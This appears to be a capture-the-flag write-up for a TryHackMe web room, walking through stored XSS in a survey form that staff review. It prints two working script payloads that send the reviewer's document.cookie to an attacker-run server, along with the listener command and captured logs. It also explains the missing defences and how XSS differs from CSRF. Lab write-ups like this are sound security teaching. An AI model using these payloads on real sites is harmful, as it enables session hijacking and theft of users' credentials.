# Cupid's Matchmaker

Room: https://tryhackme.com/room/lafb2026e3

## ⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution:  
https://github.com/garthheff/CTF-Hints/blob/main/Love%20at%20First%20Breach%202026%20%20/Cupid's%20Matchmaker.md

## Scenario

**Cupid's Matchmaker** claims that real humans manually review each personality survey to match users with compatible singles.

That wording is a strong clue. If staff are reviewing submitted responses in an admin panel, any unsanitized input may later be rendered in a privileged user’s browser. That makes **stored XSS** a likely attack path.

---

## Initial discovery

After exploring the site, there is a survey form with several user controlled input fields.

Because the application states that submissions are manually reviewed by humans, a good hypothesis is that survey answers are stored and later displayed to staff. If user input is rendered without proper output encoding, JavaScript can execute when an administrator or reviewer opens the submission.

This pattern strongly suggests a **Stored Cross-Site Scripting (Stored XSS)** vulnerability.

---

## Capturing requests

Start a simple web server locally to capture incoming requests from the victim browser.

```
python3 -m http.server 8000
```

---

## XSS payload

Place the payload in the **“Any dealbreakers or things to avoid?”** field. It would likely work in other input fields as well depending on how the application renders user data.

Update the IP address with your own machine IP.

```html
<script>
fetch("http://10.64.123.142:8000/" + encodeURIComponent(document.cookie))
</script>
```

If a staff member later opens the survey and the input is rendered unsafely, the JavaScript executes in their browser and sends their cookie to the attacker controlled server.

---

## Alternate payload test

Initially it looked like the payload was not working, so I tested a different exfiltration method.

```html
<script>
new Image().src="http://10.64.123.142:8000/?p="+encodeURIComponent(document.cookie)
</script>
```

After about 5 minutes i got a flood of requests appeared on the Python server which confirmed that the injected JavaScript was executing the CTF was just a bit slow.

Note: this is **still XSS**, not SSRF.
The request is being made by the victim’s **browser**, not the web **server**.

---

## Captured result

Once the survey was reviewed, the Python server received a request containing the cookie value.

```
python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.64.170.90 - - [11/Mar/2026 09:05:53] code 404, message File not found
10.64.170.90 - - [11/Mar/2026 09:05:53] "GET /flag%3DTHM%7B43423423%7D HTTP/1.1" 404 -
```

The flag appears URL encoded in the request path.

Example:

```
flag%3DTHM%7B43423423%7D
```

Decoding it reveals:

```
flag=THM{43423423}
```

You can decode the value using tools such as:

[https://www.urldecoder.org/](https://www.urldecoder.org/)

---

## Why this worked

For this attack to succeed, the application likely had two weaknesses:

**Stored XSS**

User input from the survey was stored and later rendered without sanitisation or proper output encoding. This allowed JavaScript to execute when a staff member viewed the submission.

**Cookie accessible to JavaScript**

The cookie could be accessed via `document.cookie`. If the `HttpOnly` flag had been enabled, JavaScript would not have been able to read the cookie.

---

## Why XSS vs CSRF can be confusing

I initially described this attack as **XSS with CSRF**, which is a common mistake when learning web exploitation.

The confusion usually comes from the fact that **both attacks involve a victim’s browser making requests to another server**.

However, the key difference is:

### XSS

XSS happens when **malicious JavaScript is injected into the web application itself** and executes inside the victim’s browser.

The attacker can then:

* read cookies
* modify the DOM
* send data to external servers
* perform actions as the victim

### CSRF

CSRF happens when a victim is tricked into **sending an unintended request to a website they are already authenticated to**, usually through a malicious link or page.

The attacker cannot run JavaScript inside the target site. They are simply abusing the fact that the victim's browser automatically includes authentication cookies.

A helpful explanation comparing the two can be found here:

[https://portswigger.net/web-security/csrf/xss-vs-csrf](https://portswigger.net/web-security/csrf/xss-vs-csrf)

An important takeaway from that article is that **XSS is generally more powerful than CSRF**. If an attacker can execute JavaScript in a victim's browser, they can often perform any action the user can perform, including bypassing CSRF protections entirely.

---

## Further learning

PortSwigger Web Security Academy provides excellent material on these topics.

XSS overview:
[https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)

Stored XSS:
[https://portswigger.net/web-security/cross-site-scripting/stored](https://portswigger.net/web-security/cross-site-scripting/stored)

